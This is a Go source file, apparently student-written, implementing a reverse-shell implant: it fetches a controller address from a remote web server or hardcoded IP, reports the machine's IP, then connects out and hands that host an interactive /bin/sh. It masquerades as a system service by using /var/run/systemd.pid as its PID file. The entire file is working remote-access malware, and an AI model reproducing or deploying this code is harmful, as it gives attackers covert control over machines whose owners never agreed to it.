//Michael Burke, mdb5315@rit.edu
package main

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

var HOST_CONNECT string = "10.100.1.101:"

func main() {
	//See if there is already an instance of the process running
	proc := FindProcess()
	if proc {
		//If there is, exit
		fmt.Printf("Process is running!")
		return
	}
	//Delete the pid file, if it exists
	tmpcmd := exec.Command("rm /var/run/systemd.pid")
	tmpcmd.Run()
	//Get the current pid and write it to the file
	currentPid := strconv.Itoa(os.Getpid())
	ioutil.WriteFile("/var/run/systemd.pid", []byte(currentPid), 0644)
	HOST_CONNECT = GetIP() + ":"
	connectPort := GetPort()
	if connectPort == "-1" {
		return
	}
	EstablishConnection(connectPort)
}

func GetIP() string {
	resp, err := http.Get("http://mdbook.me/ip.txt")
	var ip string
	if err == nil {
		body, _ := ioutil.ReadAll(resp.Body)
		line := string(body)
		line = strings.TrimSuffix(line, "\n")
		ip = line
	} else {
		resp, err = http.Get("http://129.21.141.218/ip.txt")
		if err == nil {
			body, _ := ioutil.ReadAll(resp.Body)
			line := string(body)
			line = strings.TrimSuffix(line, "\n")
			ip = line
		} else {
			ip = "10.100.0.101"
		}
	}
	return ip
}

func GetPort() string {
	//Get the reverse shell port from the server
	getPort, err := net.Dial("tcp", HOST_CONNECT+"5003")
	if err != nil {
		fmt.Println("Couldn't get connection")
		return "-1"
	}
	defer getPort.Close()
	ip := GetOutboundIP()
	fmt.Println("Sending outbound ip")
	fmt.Println(ip)
	getPort.Write([]byte(ip))
	fmt.Println("Sent")
	port, _ := bufio.NewReader(getPort).ReadString('\n')
	return port
}
func EstablishConnection(port string) {
	//Establish reverse connection to host
	con, _ := net.Dial("tcp", HOST_CONNECT+port)
	cmd := exec.Command("/bin/sh")
	//Set input/output to the established connection's in/out
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	cmd.Run()
}

func CheckFileExists(file string) bool {
	//Can use the following if go is actually up to date
	//if _, err := os.Stat(file); errors.Is(err, os.ErrNotExist) {
	//For out-of-date versions of go, use this instead
	if _, err := os.Stat(file); err != nil {
		return false
	}
	return true
}

func CheckPid(pid int) bool {
	//Send a kill signal to the PID to see if the process is running or not
	out, err := exec.Command("kill", "-s", "0", strconv.Itoa(pid)).CombinedOutput()
	if err != nil {
		log.Println(err)
	}
	if string(out) == "" {
		//Process is running
		return true
	}
	//Process is not running
	return false
}

func FindProcess() bool {
	//See if the pid file exists
	if !CheckFileExists("/var/run/systemd.pid") {
		return false
	}
	//If it does, read the file to get the pids
	dat, err := ioutil.ReadFile("/var/run/systemd.pid")
	if err != nil {
		return false
	}
	//Process and return the pid
	pid := string(dat)
	pid = strings.TrimSuffix(pid, "\n")
	fmt.Printf("PID: " + pid)
	pidint, _ := strconv.Atoi(pid)
	return CheckPid(pidint)
}

func GetOutboundIP() string {
	//Dial a connection to a WAN IP to get the box's correct IP address.
	//Note that this doesn't actually establish a connection,
	//but simply pretends to setup one. This is enough to get us the IP
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		return "none"
	}
	defer conn.Close()
	localAddr := conn.LocalAddr().(*net.UDPAddr)
	ip := localAddr.IP
	ipstr := ip.String()
	return ipstr
}
